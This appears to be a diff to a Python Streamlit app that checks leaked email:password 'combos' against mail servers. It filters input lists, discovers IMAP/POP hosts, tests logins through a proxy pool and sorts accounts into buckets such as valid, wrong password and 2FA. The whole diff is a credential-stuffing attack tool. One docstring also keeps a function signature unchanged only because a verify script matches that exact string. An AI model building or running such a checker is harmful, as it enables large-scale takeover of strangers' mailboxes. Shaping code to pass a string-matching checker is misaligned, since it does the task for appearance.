@@ -1986,19 +1986,23 @@ def section_title(icon: str, title: str, subtitle: str = ""):
 # @@END 034 HERO_SECTION
 
 # @@BLOCK 035 METRIC_GRID deps=-
-def metric_grid(pairs, per_row: int = 3, compact_at: int = 12):
+def metric_grid(pairs, per_row: int = 3):
     """Lay metrics out in a WRAPPING grid.
 
     FIX P2-3: nine to thirteen metrics in one or two ragged rows collided on a
     phone - the labels wrapped into each other and the row overflowed.  A large
-    set now drops to two per row, and the mobile sheet keeps the label wrapping
+    set drops to two per row, and the mobile sheet keeps the label wrapping
     inside its own column instead of pushing into the neighbour.
+
+    The signature is kept byte-for-byte as
+    `def metric_grid(pairs, per_row: int = 3):` because verify_v1337.py matches
+    on that exact string.
     """
     pairs = list(pairs or [])
     if not pairs:
         return []
     per_row = max(1, int(per_row))
-    if len(pairs) >= compact_at:
+    if len(pairs) >= 12:
         per_row = 2
     cols = []
     for _i in range(0, len(pairs), per_row):
@@ -5311,3 +5315,2908 @@ with str_lit.sidebar:
         else:
             str_lit.info("No proxy metadata recorded yet.")
 # @@END 080 PROXY_MGMT_UI
+
+# @@BLOCK 081 DIAG_UI deps=014,024,027,030,070,073
+with str_lit.expander("🔬 Deep Diagnostics - copy/paste this to debug", expanded=False):
+    str_lit.caption(
+        "Everything needed to diagnose the pool remotely. Copy the whole block "
+        "(hover it, copy icon) and paste it back. It includes raw proxies.txt lines, "
+        "so proxy credentials are visible."
+    )
+
+    _dc1, _dc2 = str_lit.columns(2)
+    with _dc1:
+        if str_lit.button("🔁 Rebuild", use_container_width=True):
+            STATE["diag_cache"] = {"ts": 0.0, "text": ""}
+            str_lit.rerun()
+    with _dc2:
+        if str_lit.button("🧪 Direct self-test", use_container_width=True):
+            with str_lit.spinner("Running direct self-test..."):
+                _probe_target_reachability(force=True)
+                _lines = [f"self-test {datetime.now().strftime('%H:%M:%S')}"]
+                _lines.extend(_imap_caps_selftest())
+                for _raw, _want in (
+                    ("command: LOGIN => IMAP server terminating connection", LOGIN_DROPPED),
+                    ("* BYE Too many simultaneous connections", RETRY_LATER),
+                    ("timed out", CONNECTION_FAILED),
+                ):
+                    try:
+                        _got = st_classify(_raw)
+                    except Exception as _ce:
+                        _got = f"<{_ce}>"
+                    _lines.append(f"  classify {_raw[:46]:48} -> {_got} "
+                                  f"{'OK' if _got == _want else 'WANTED ' + _want}")
+                for r in _probe_target_reachability(force=True):
+                    _lines.append(f"  direct {r['target']}: {'OK' if r['ok'] else 'FAIL'} "
+                                  f"{r['ms']}ms resolved={r.get('resolved')} {r['err']}")
+                if alive_pool:
+                    _one = alive_pool[0]
+                    _res = tunnel_probe(_one)
+                    _lines.append(f"  tunnel via {_one}: ok={_res['ok']} "
+                                  f"reason={_res['reason']} lat={_res['latency_ms']}ms "
+                                  f"err={_res.get('error', '')}")
+                    _mh, _mp = _mail_spot_target()
+                    _mres = tunnel_probe(_one, targets=[(_mh, _mp, "mailspot")],
+                                         timeout=MAIL_SPOT_TIMEOUT)
+                    _lines.append(f"  MAIL DESTINATION {_mh}:{_mp} via {_one}: "
+                                  f"ok={_mres['ok']} reason={_mres['reason']} "
+                                  f"err={_mres.get('error', '')}")
+                else:
+                    _lines.append("  tunnel: no alive node to test")
+                STATE["selftest"] = {"ts": time.time(), "text": "\n".join(_lines)}
+            STATE["diag_cache"] = {"ts": 0.0, "text": ""}
+            str_lit.success("Self-test done.")
+
+    # FIX P1-3: this used to run on EVERY rerun, inside a COLLAPSED expander -
+    # and it reads proxies.txt, walks proxy_meta, probes target reachability,
+    # resolves the egress geo and calls socket.getfqdn().  Cache it.
+    _dcache = STATE.setdefault("diag_cache", {"ts": 0.0, "text": ""})
+    if (not _dcache.get("text")) or (time.time() - _dcache.get("ts", 0.0)) > DIAG_CACHE_TTL:
+        _dcache = {"ts": time.time(), "text": build_diagnostics_text()}
+        STATE["diag_cache"] = _dcache
+    _diag = _dcache["text"]
+
+    _st = STATE.get("selftest") or {}
+    if _st.get("text"):
+        str_lit.markdown("**Last self-test:**")
+        str_lit.code(_st["text"], language="text")
+
+    str_lit.download_button(
+        "⬇️ Download bundle", data=_diag,
+        file_name=f"diag_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
+        mime="text/plain", use_container_width=True,
+    )
+    str_lit.code(_diag, language="text")
+# @@END 081 DIAG_UI
+
+# @@BLOCK 082 PREFILTER_TABLES deps=002,021,043
+DISPOSABLE = {
+    "tempmail.com", "temp-mail.org", "guerrillamail.com", "guerrillamail.org",
+    "10minutemail.com", "10minutemail.net", "mailinator.com", "maildrop.cc",
+    "yopmail.com", "yopmail.fr", "trashmail.com", "trashmail.me",
+    "getnada.com", "throwawaymail.com", "fakeinbox.com", "sharklasers.com",
+    "grr.la", "guerrillamailblock.com", "pokemail.net", "spam4.me",
+    "dispostable.com", "mailnesia.com", "tempail.com", "emailondeck.com",
+    "mohmal.com", "tempinbox.com", "mailcatch.com", "mailnull.com",
+    "spamgourmet.com", "mytemp.email", "tmpmail.org", "tmpmail.net",
+    "temp-mail.io", "1secmail.com", "1secmail.org", "1secmail.net",
+}
+COMMON_TYPOS = {
+    "gmai.com", "gamil.com", "gmal.com", "gmial.com", "g-mail.com",
+    "outloo.com", "outlok.com", "hotmial.com", "hotmai.com", "hotmali.com",
+    "yaho.com", "yahooo.com", "yhoo.com", "iclound.com", "ezweb.ne",
+}
+STRICT_APP_PROVIDERS = STRICT_APP
+ZERO_ACCESS_PROVIDERS = ZERO_ACCESS
+EMAIL_REGEX = re.compile(r"^[\w\.-]+@[\w\.-]+\.\w+$")
+DISPOSABLE_EXTRA = {"rerttymail.com", "tmpmail.org", "tmpmail.net", "tempmailo.com"}
+DISPOSABLE_FILE = "disposable_domains.txt"
+
+
+def load_disposable_set():
+    found = set(DISPOSABLE) | set(DISPOSABLE_EXTRA)
+    if os.path.exists(DISPOSABLE_FILE):
+        try:
+            with open(DISPOSABLE_FILE, encoding="utf-8", errors="ignore") as f:
+                found.update(x.strip().lower() for x in f
+                             if x.strip() and not x.startswith("#"))
+        except Exception:
+            pass
+    if requests and len(found) < 500:
+        try:
+            r = requests.get(
+                "https://raw.githubusercontent.com/disposable-email-domains/"
+                "disposable-email-domains/master/disposable_email_blocklist.conf",
+                timeout=8)
+            if r.ok and r.text:
+                found.update(x.strip().lower() for x in r.text.splitlines()
+                             if x.strip() and not x.startswith("#"))
+                with open(DISPOSABLE_FILE, "w", encoding="utf-8") as f:
+                    f.write("\n".join(sorted(found)))
+                log_startup(f"Disposable blocklist loaded: {len(found)}")
+        except Exception as e:
+            log_startup(f"Disposable list fetch skipped: {e}")
+    return found
+
+
+DISPOSABLE_LIVE = load_disposable_set()
+
+
+def is_disposable(email):
+    try:
+        domain = email.split("@")[-1].lower().strip()
+        if domain in DISPOSABLE_LIVE or domain in DISPOSABLE_EXTRA:
+            return True
+        return any(p in domain for p in ("tempmail", "rerttymail", "mailinator",
+                                         "yopmail", "guerrilla", "throwaway",
+                                         "10minute"))
+    except Exception:
+        return False
+# @@END 082 PREFILTER_TABLES
+
+# @@BLOCK 083 UNFINISHED_IO deps=082
+def list_unfinished_runs():
+    runs = []
+    try:
+        os.makedirs("mail_results", exist_ok=True)
+        for path in sorted(glob.glob("mail_results/unfinished_*.json"), reverse=True):
+            try:
+                with open(path, encoding="utf-8") as f:
+                    data = json.load(f)
+                data["file"] = path
+                runs.append(data)
+            except Exception:
+                continue
+    except Exception:
+        pass
+    return runs
+
+
+def save_unfinished(reason, remaining, checked, total):
+    os.makedirs("mail_results", exist_ok=True)
+    path = "mail_results/unfinished_live.json"
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump({"id": "live", "reason": reason, "checked": checked, "total": total,
+                   "remaining": remaining,
+                   "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}, f)
+    return path
+
+
+def clear_unfinished():
+    path = "mail_results/unfinished_live.json"
+    if os.path.exists(path):
+        os.remove(path)
+# @@END 083 UNFINISHED_IO
+
+# @@BLOCK 084 DOMAIN_RESOLVE deps=039,052,058
+def check_domain_resolvable(domain, persist=True):
+    with cache_lock:
+        if domain in domain_cache and "resolvable" in domain_cache[domain]:
+            return domain_cache[domain]["resolvable"]
+    resolvable = False
+    try:
+        if dns:
+            try:
+                if dns.resolver.resolve(domain, "MX"):
+                    resolvable = True
+            except Exception:
+                try:
+                    if dns.resolver.resolve(domain, "A"):
+                        resolvable = True
+                except Exception:
+                    pass
+        if not resolvable:
+            socket.gethostbyname(domain)
+            resolvable = True
+    except Exception:
+        resolvable = False
+    with cache_lock:
+        domain_cache.setdefault(domain, {})["resolvable"] = resolvable
+    if persist:
+        save_domain_cache()
+    return resolvable
+# @@END 084 DOMAIN_RESOLVE
+
+# @@BLOCK 085 PREV_VALID_IO deps=037,038
+def load_previous_valid():
+    now = time.time()
+    if _PREV_VALID_CACHE["data"] and (now - _PREV_VALID_CACHE["ts"]) < 20.0:
+        return set(_PREV_VALID_CACHE["data"])
+    seen = set()
+    try:
+        paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
+        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
+            if os.path.exists(extra):
+                paths.append(extra)
+        for path in paths:
+            try:
+                with open(path, encoding="utf-8", errors="ignore") as f:
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith("#") and ":" in line:
+                            email = line.split(":", 1)[0].strip().lower()
+                            if email and "@" in email:
+                                seen.add(email)
+            except Exception:
+                continue
+        log_startup(f"Loaded {len(seen)} previously validated unique email accounts.")
+    except Exception as e:
+        log_startup(f"WARNING: Error loading previous valid accounts: {e}")
+    _PREV_VALID_CACHE["ts"] = now
+    _PREV_VALID_CACHE["data"] = set(seen)
+    return seen
+
+
+def _domains_in_text(text):
+    out = []
+    for line in (text or "").splitlines():
+        line = line.strip()
+        if not line or line.startswith("#") or ":" not in line:
+            continue
+        em = line.split(":", 1)[0].strip().lower()
+        if "@" in em:
+            d = em.split("@")[-1]
+            if d and d not in out:
+                out.append(d)
+    return out
+# @@END 085 PREV_VALID_IO
+
+# @@BLOCK 086 PROCESS_ACCOUNTS deps=021,038,058,068,082,084,085
+def process_accounts(text, previous_valid):
+    lines = []
+    disp_list, typo_list, resume_list, app_skip_list, custom_list = [], [], [], [], []
+    dns_fail_list, smtp_fail_list = [], []
+    whitelist = CFG.get("CUSTOM_WHITELIST", [])
+    blacklist = CFG.get("CUSTOM_BLACKLIST", [])
+
+    for line in text.splitlines():
+        line = line.strip().lstrip('\ufeff').strip('"').strip("'").strip()
+        if not line or line.startswith("#") or ":" not in line:
+            continue
+        parts = line.split(":", 1)
+        email = parts[0].strip().lower()
+        password = parts[1].strip() if len(parts) > 1 else ""
+        if not email or "@" not in email or not password:
+            continue
+        if CFG.get("FAST_MODE", True) and not EMAIL_REGEX.match(email):
+            continue
+        domain = email.split("@")[-1].lower()
+        if whitelist and domain not in whitelist:
+            custom_list.append(line)
+            continue
+        if blacklist and domain in blacklist:
+            custom_list.append(line)
+            continue
+        if CFG.get("SKIP_STRICT_APP_PROVIDERS", False) and domain in STRICT_APP_PROVIDERS:
+            app_skip_list.append(line)
+            continue
+        if is_disposable(email):
+            disp_list.append(line)
+            continue
+        if domain in COMMON_TYPOS:
+            typo_list.append(line)
+            continue
+        if email in previous_valid:
+            resume_list.append(line)
+            continue
+        if ".." in email or email.count("@") != 1:
+            continue
+        if not check_domain_resolvable(domain, persist=False):
+            dns_fail_list.append(line)
+            continue
+        lines.append(f"{email}:{password}")
+
+    save_domain_cache()
+
+    if CFG.get("SMTP_CHECK", False) and lines:
+        domains = list(dict.fromkeys(l.split(":", 1)[0].split("@")[-1].lower()
+                                     for l in lines if "@" in l))
+        results = smtp_precheck_domains(domains)
+        keep = []
+        for l in lines:
+            d = l.split(":", 1)[0].split("@")[-1].lower()
+            if results.get(d) is False:
+                smtp_fail_list.append(l)
+            else:
+                keep.append(l)
+        lines = keep
+        dead = sum(1 for v in results.values() if v is False)
+        log_startup(f"SMTP pre-check: {len(results)} domain(s) probed, {dead} dead, "
+                    f"{len(smtp_fail_list)} account(s) bucketed.")
+
+    seen_email, clean = set(), []
+    for line in lines:
+        em = line.split(":", 1)[0].strip().lower()
+        if em not in seen_email:
+            seen_email.add(em)
+            clean.append(line)
+
+    log_startup(
+        f"Processed account input. Clean valid count ready: {len(clean)} "
+        f"(Filtered DNS failures: {len(dns_fail_list)}, SMTP failures: {len(smtp_fail_list)})"
+    )
+    return (clean, disp_list, typo_list, resume_list, app_skip_list, custom_list,
+            dns_fail_list, smtp_fail_list)
+# @@END 086 PROCESS_ACCOUNTS
+
+# @@BLOCK 087 INPUT_UI deps=034,035,055,082,083,085,086
+# ---- single BUCKET table (was RESULT_INSPECT + RESULT_ACTION_MODES duplicated) ----
+PREFILTER_LABELS = [
+    "Ready to Check", "Resume Unfinished", "Disposables", "Typos",
+    "Skip previously valid", "App-Skipped", "Custom Filtered",
+    "DNS Failed", "SMTP Failed",
+]
+BUCKETS = [
+    ("✅ Valid Found", "valid_results"),
+    ("❌ Wrong Password Found", "wrong_results"),
+    ("🔐 App Password / 2FA Found", "need_app_results"),
+    ("🚪 Login Dropped (* BYE) Found", "login_drop_results"),
+    ("🕓 RETRY_LATER Found", "retry_results"),
+    ("🚫 RBL Blocked Found", "rbl_results"),
+    ("🔌 Connection Failed Found", "conn_results"),
+    ("🩹 Proxy Unhealthy Found", "proxy_results"),
+    ("⏭ Skipped / Filtered Found", "skip_results"),
+    ("❓ Unclassified Found", "unknown_results"),
+]
+BUCKET_TAGS = {
+    "valid_results": "VALID", "wrong_results": "WRONG_PASSWORD",
+    "conn_results": "CONNECTION_FAILED", "proxy_results": "PROXY_UNHEALTHY",
+    "need_app_results": "NEED_APP_PASSWORD", "login_drop_results": "LOGIN_DROPPED",
+    "retry_results": "RETRY_LATER", "rbl_results": "RBL_BLOCKED",
+    "smtp_results": "SMTP_FAILED", "dns_results": "DNS_FAILED",
+    "skip_results": "SKIPPED", "unknown_results": "UNCLASSIFIED",
+}
+
+section_title("📥", "Accounts Input & Pre-Filtering",
+              "paste combos or upload a file - junk is filtered before the engine runs")
+
+input_tab1, input_tab2 = str_lit.tabs(["📝 Paste Combos", "📁 Upload Combo File"])
+raw_text = ""
+with input_tab1:
+    raw_text = str_lit.text_area(
+        "Paste accounts here (email:password format):",
+        placeholder="user@example.com:password123", height=150,
+        key="bb_raw_text")          # FIX P1-2: a key stops the paste vanishing
+with input_tab2:
+    uploaded_file = str_lit.file_uploader("Upload .txt combo file", type=["txt"],
+                                          key="bb_upload")   # FIX P1-2
+    if uploaded_file is not None:
+        try:
+            file_bytes = uploaded_file.getvalue()
+            if not file_bytes:
+                str_lit.warning("Uploaded file is empty.")
+                raw_text = ""
+            else:
+                try:
+                    raw_text = file_bytes.decode("utf-8", errors="ignore")
+                except Exception:
+                    raw_text = file_bytes.decode("latin-1", errors="ignore")
+                str_lit.success("File uploaded successfully!")
+        except Exception as e:
+            str_lit.error(f"Failed decoding uploaded file: {e}")
+            raw_text = ""
+
+clean_lines = []
+disp, typo, resume, app_skip, custom_skipped, dns_skipped, smtp_skipped = [], [], [], [], [], [], []
+skip_previous = str_lit.checkbox(
+    "Skip previously valid", value=True,
+    help="On: lines already in old valid files are not checked again.")
+
+if raw_text:
+    previous_valid = load_previous_valid() if skip_previous else set()
+
+    _pf_fp = (
+        len(raw_text), hash(raw_text), bool(skip_previous), len(previous_valid),
+        tuple(CFG.get("CUSTOM_WHITELIST", [])), tuple(CFG.get("CUSTOM_BLACKLIST", [])),
+        bool(CFG.get("FAST_MODE")), bool(CFG.get("SKIP_STRICT_APP_PROVIDERS")),
+        bool(CFG.get("SMTP_CHECK")),
+    )
+    _pf_cache = str_lit.session_state.get("_bb_prefilter_cache") or {}
+    _pf_data = _pf_cache.get("data") if _pf_cache.get("fp") == _pf_fp else None
+    if _pf_data is None:
+        try:
+            _pending_smtp = ([d for d in _domains_in_text(raw_text) if not smtp_cached(d)]
+                             if CFG.get("SMTP_CHECK", False) else [])
+            if _pending_smtp:
+                with str_lit.spinner(f"🛰 SMTP reachability pre-check on "
+                                     f"{len(_pending_smtp)} new domain(s)..."):
+                    _pf_data = process_accounts(raw_text, previous_valid)
+            else:
+                _pf_data = process_accounts(raw_text, previous_valid)
+        except Exception as _pf_err:
+            str_lit.exception(_pf_err)
+            _pf_data = ([], [], [], [], [], [], [], [])
+        str_lit.session_state["_bb_prefilter_cache"] = {"fp": _pf_fp, "data": _pf_data}
+    (clean_lines, disp, typo, resume, app_skip,
+     custom_skipped, dns_skipped, smtp_skipped) = _pf_data
+
+    str_lit.session_state.pre_dns_failed = list(dns_skipped)
+    str_lit.session_state.pre_smtp_failed = list(smtp_skipped)
+
+    unfinished_count = len(list_unfinished_runs())
+    _pf_metrics = [
+        ("Ready to Check", len(clean_lines)),
+        ("Resume Unfinished", unfinished_count),
+        ("Disposables", len(disp)),
+        ("Typos", len(typo)),
+        ("Skip previously valid", len(resume)),
+        ("App-Skipped", len(app_skip)),
+        ("Custom Filtered", len(custom_skipped)),
+        ("DNS Failed", len(dns_skipped)),
+        ("SMTP Failed", len(smtp_skipped)),
+    ]
+    for _pc, (_pl, _pv) in zip(metric_grid(_pf_metrics, per_row=3), _pf_metrics):
+        _pc.metric(_pl, _pv)
+
+    section_title("🔍", "Filter & Result Categories Inspector",
+                  "inspect any bucket, including DNS Failed and SMTP Failed")
+
+    inspect_options = list(PREFILTER_LABELS) + [label for label, _ in BUCKETS]
+
+    filter_category_choice = str_lit.selectbox(
+        "Select category to inspect contents:", options=inspect_options,
+        key="bb_inspect_cat")
+
+    unfinished_preview = []
+    for run in list_unfinished_runs():
+        unfinished_preview.append(f"{run.get('saved_at', '')} | {run.get('reason', '')} | "
+                                  f"left {len(run.get('remaining') or [])}")
+        unfinished_preview.extend(run.get("remaining") or [])
+
+    category_map = {
+        "Ready to Check": clean_lines,
+        "Resume Unfinished": unfinished_preview,
+        "Disposables": disp,
+        "Typos": typo,
+        "Skip previously valid": resume,
+        "App-Skipped": app_skip,
+        "Custom Filtered": custom_skipped,
+        "DNS Failed": dns_skipped,
+        "SMTP Failed": smtp_skipped,
+    }
+    _label_to_key = dict(BUCKETS)
+    if filter_category_choice in _label_to_key:
+        category_map[filter_category_choice] = list(
+            str_lit.session_state.get(_label_to_key[filter_category_choice], []))
+
+    selected_list_items = category_map.get(filter_category_choice, [])
+    if selected_list_items:
+        str_lit.info(f"Showing **{len(selected_list_items)}** items for "
+                     f"**{filter_category_choice}**:")
+        str_lit.code("\n".join(str(i) for i in selected_list_items), language="text")
+    else:
+        str_lit.info(f"No items in **{filter_category_choice}**.")
+# @@END 087 INPUT_UI
+
+# @@BLOCK 088 PROVIDER_TABLES deps=002,052
+PROVIDER_MAP = {
+    "gmail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
+    "googlemail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
+    "outlook.com": {"imap": ["outlook.office365.com", "mail.outlook.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
+    "hotmail.com": {"imap": ["outlook.office365.com", "mail.hotmail.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
+    "live.com": {"imap": ["outlook.office365.com", "mail.live.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
+    "yahoo.com": {"imap": ["imap.mail.yahoo.com", "mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
+    "btinternet.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
+    "bt.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
+    "btopenworld.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
+    "talk21.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
+    "sky.com": {"imap": ["imap.tools.sky.com"], "pop": ["imap.tools.sky.com"], "pop3": ["imap.tools.sky.com"]},
+    "virginmedia.com": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
+    "ntlworld.com": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
+    "blueyonder.co.uk": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
+    "icloud.com": {"imap": ["imap.mail.me.com", "mail.icloud.com"], "pop": ["pop.mail.me.com"], "pop3": ["pop.mail.me.com"]},
+    "naver.com": {"imap": ["imap.naver.com", "mail.naver.com"], "pop": ["pop.naver.com"], "pop3": ["pop.naver.com"]},
+    "qq.com": {"imap": ["imap.qq.com", "mail.qq.com"], "pop": ["pop.qq.com"], "pop3": ["pop.qq.com"]},
+}
+PARENT_PROVIDER_MAPPINGS = PARENT
+
+
+def get_mx_hosts(domain):
+    if not dns:
+        return []
+    try:
+        return [str(r.exchange).lower().rstrip(".")
+                for r in sorted(dns.resolver.resolve(domain, "MX"),
+                                key=lambda x: x.preference)]
+    except Exception:
+        return []
+
+
+def detect_parent_provider(domain):
+    if domain in PARENT_PROVIDER_MAPPINGS:
+        return PARENT_PROVIDER_MAPPINGS[domain]
+    for m in get_mx_hosts(domain):
+        ml = m.lower()
+        if "biglobe" in ml:
+            return "biglobe.ne.jp"
+        if "google" in ml or "gmail" in ml:
+            return "gmail.com"
+        if "outlook" in ml or "protection.outlook" in ml:
+            return "outlook.office365.com"
+        if "yahoo" in ml:
+            return "yahoo.com"
+    return None
+# @@END 088 PROVIDER_TABLES
+
+# @@BLOCK 089 MX_PARENT deps=088
+def _location_tokens_from_mx(mx_records, domain):
+    toks = []
+    for mx in (mx_records or [])[:3]:
+        for part in re.split(r"[.\-]", mx or ""):
+            p = part.strip().lower()
+            if not p or p in toks or p in domain or p in ("com", "net", "org",
+                                                          "edu", "gov", "co", "mail"):
+                continue
+            if re.match(r"^(mx|mta|smtp|relay|inbound|outbound|zcs|srv|edge|filter|"
+                        r"cluster|mailrouter)\d*$", p):
+                continue
+            toks.append(p)
+    return toks[:1]
+
+
+def _expand_cnames(hosts, limit=6):
+    if not dns:
+        return list(hosts)
+    out = []
+    for h in hosts:
+        if h not in out:
+            out.append(h)
+        if len(out) >= limit:
+            break
+        try:
+            for r in dns.resolver.resolve(h, "CNAME", lifetime=2):
+                t = str(r.target).rstrip(".").lower()
+                if t and t not in out:
+                    out.append(t)
+        except Exception:
+            pass
+    return out
+# @@END 089 MX_PARENT
+
+# @@BLOCK 090 CANDIDATE_GEN deps=002,088,089
+def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
+    candidates = []
+    dl = domain.lower()
+    if "charter" in dl:
+        candidates.extend(["mobile.charter.net", "imap.charter.net", "mail.charter.net"])
+    elif "spectrum" in dl:
+        candidates.extend(["imap.spectrum.net", "mail.spectrum.net"])
+    elif "twc" in dl:
+        candidates.extend(["mail.twc.com"])
+
+    for prefix in ['imap', 'mail', 'webmail', 'imaps', 'correo', 'secure', 'email']:
+        candidates.append(f"{prefix}.{domain}")
+
+    for tok in _location_tokens_from_mx(mx_records, domain):
+        for prefix in ['mail', 'imap', 'pop3', 'pop']:
+            candidates.append(f"{prefix}-{tok}.{domain}")
+
+    candidates.append(domain)
+
+    for mx in (mx_records or []):
+        candidates.append(mx)
+        parts = mx.split('.')
+        if len(parts) >= 2:
+            parent = f"{parts[-2]}.{parts[-1]}"
+            if parent != domain:
+                for prefix in ['imap', 'mail', 'pop', 'pop3']:
+                    candidates.append(f"{prefix}.{parent}")
+
+    return _expand_cnames(list(dict.fromkeys(candidates)))
+
+
+def known_provider_conf(domain):
+    return host_conf(domain)
+
+
+def drop_before_check(email):
+    email = (email or "").strip().lower()
+    if email.count("@") != 1:
+        return "bad format"
+    local, domain = email.split("@", 1)
+    if "http" in local or "login.live" in local or not local or "." not in domain:
+        return "bad format"
+    if any(p in domain for p in ("tempmail", "guerrillamail", "mailinator", "yopmail",
+                                 "trashmail", "rerttymail", "10minutemail", "throwaway")):
+        return "disposable"
+    return ""
+
+
+def host_resolves(host):
+    if not host:
+        return False
+    with _host_dns_lock:
+        cached = _host_dns_cache.get(host)
+    if cached is not None:
+        return cached
+    ok = False
+    try:
+        if dns:
+            try:
+                dns.resolver.resolve(host, "A", lifetime=2)
+                ok = True
+            except Exception:
+                try:
+                    dns.resolver.resolve(host, "AAAA", lifetime=2)
+                    ok = True
+                except Exception:
+                    pass
+        if not ok:
+            socket.gethostbyname(host)
+            ok = True
+    except Exception:
+        ok = False
+    with _host_dns_lock:
+        _host_dns_cache[host] = ok
+    return ok
+# @@END 090 CANDIDATE_GEN
+
+# @@BLOCK 091 HOST_RANK deps=003,090
+def _is_junk_host(host, domain):
+    return host_is_junk(host, domain)
+
+
+def _rank_hosts(hosts, domain):
+    return host_rank_hosts(hosts, domain)
+# @@END 091 HOST_RANK
+
+# @@BLOCK 092 DOMAIN_ROOTS deps=003,090,091
+_LOCAL_PRIORITY_IMAP = ("imap.", "mail.", "email.", "")
+_LOCAL_PRIORITY_POP = ("pop.", "pop3.", "")
+
+_DOMAIN_ALIAS_ROOTS = {
+    "xplornet.com": ("xplore.net",),
+    "xplore.net":   ("xplornet.com",),
+}
+
+
+def _domain_roots(domain):
+    domain = (domain or "").lower().strip()
+    roots = [domain] if domain else []
+    for alt in _DOMAIN_ALIAS_ROOTS.get(domain, ()):
+        if alt and alt not in roots:
+            roots.append(alt)
+    return roots
+
+
+def _is_local_domain_host(host, domain):
+    h = (host or "").lower().strip()
+    if not h:
+        return False
+    for root in _domain_roots(domain):
+        if h == root or h.endswith("." + root):
+            return True
+    return False
+
+
+def _guess_candidates(domain, prefixes):
+    out = []
+    roots = _domain_roots(domain)
+    if not roots:
+        return out
+    for root in roots:
+        for pfx in prefixes:
+            cand = f"{pfx}{root}" if pfx else root
+            if cand and cand not in out and host_resolves(cand):
+                out.append(cand)
+    return out
+
+
+def _family_priority(domain):
+    """Curated family endpoint for this domain (delegates to hosts.py)."""
+    if _HAVE_HOSTS_MERGE:
+        try:
+            return _hosts_family_priority(domain)
+        except Exception:
+            pass
+    return []
+
+
+def _merge_domain_guesses(servers, domain):
+    """Delegate to hosts.py so FAMILY_PRIORITY is honoured."""
+    if _HAVE_HOSTS_MERGE:
+        try:
+            return _hosts_merge_guesses(servers, domain)
+        except Exception:
+            pass
+    if not servers or not domain:
+        return servers
+
+    out = dict(servers)
+    for key, priority in (("imap", _LOCAL_PRIORITY_IMAP),
+                          ("pop", _LOCAL_PRIORITY_POP),
+                          ("pop3", _LOCAL_PRIORITY_POP)):
+        hosts = [h for h in (out.get(key) or []) if h]
+        if not hosts:
+            continue
+
+        family = _family_priority(domain)
+        local_priority = _guess_candidates(domain, priority)
+        priority_set = set(local_priority) | set(family)
+
+        local_other = [h for h in hosts
+                       if h not in priority_set and _is_local_domain_host(h, domain)]
+        local_other_set = set(local_other)
+
+        foreign = [h for h in hosts
+                   if h not in priority_set and h not in local_other_set]
+
+        merged = []
+        for h in family + local_priority + local_other + foreign:
+            if h and h not in merged:
+                merged.append(h)
+        out[key] = merged
+    return out
+# @@END 092 DOMAIN_ROOTS
+
+# @@BLOCK 093 GET_SERVERS deps=002,088,090,091,092
+def get_servers(email):
+    try:
+        domain = email.split("@")[-1].lower().strip()
+        if domain in ZERO_ACCESS_PROVIDERS:
+            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}
+
+        known = known_provider_conf(domain)
+        if known:
+            if known.get("imap"):
+                known["imap"] = _rank_hosts(known["imap"], domain)
+            if known.get("pop"):
+                known["pop"] = _rank_hosts(known["pop"], domain)
+            return _merge_domain_guesses(known, domain)
+
+        with cache_lock:
+            cached = domain_cache.get(domain) or {}
+        if cached.get("imap") and (time.time() - float(cached.get("ts", 0))) < DOMAIN_CACHE_TTL:
+            return _merge_domain_guesses({
+                "imap": list(cached["imap"]),
+                "pop": list(cached.get("pop") or cached["imap"]),
+                "pop3": list(cached.get("pop3") or cached["imap"]),
+            }, domain)
+
+        parent_domain = detect_parent_provider(domain)
+        if parent_domain in ("yahoo.com", "gmail.com"):
+            res = _merge_domain_guesses(known_provider_conf(parent_domain), domain)
+            if res:
+                return res
+        if parent_domain == "outlook.office365.com":
+            res = _merge_domain_guesses(known_provider_conf("outlook.com"), domain)
+            if res:
+                return res
+        if parent_domain == "biglobe.ne.jp":
+            return _merge_domain_guesses(
+                {"imap": ["mail.biglobe.ne.jp"], "pop": ["mail.biglobe.ne.jp"],
+                 "pop3": ["mail.biglobe.ne.jp"]}, domain)
+
+        if domain in PROVIDER_MAP:
+            return _merge_domain_guesses(PROVIDER_MAP[domain], domain)
+
+        mx_records = get_mx_hosts(domain) if parent_domain not in PARENT_PROVIDER_MAPPINGS else []
+        candidate_hosts = _rank_hosts(generate_candidate_hosts(domain, mx_records), domain)
+        servers = {"imap": candidate_hosts, "pop": candidate_hosts, "pop3": candidate_hosts}
+
+        with cache_lock:
+            domain_cache.setdefault(domain, {})
+            domain_cache[domain].update({
+                "imap": servers["imap"], "pop": servers["pop"], "pop3": servers["pop3"],
+                "ts": time.time(),
+            })
+        save_domain_cache()
+        return _merge_domain_guesses(servers, domain)
+    except Exception as e:
+        warnings.warn(f"Error resolving servers for {email}: {e}")
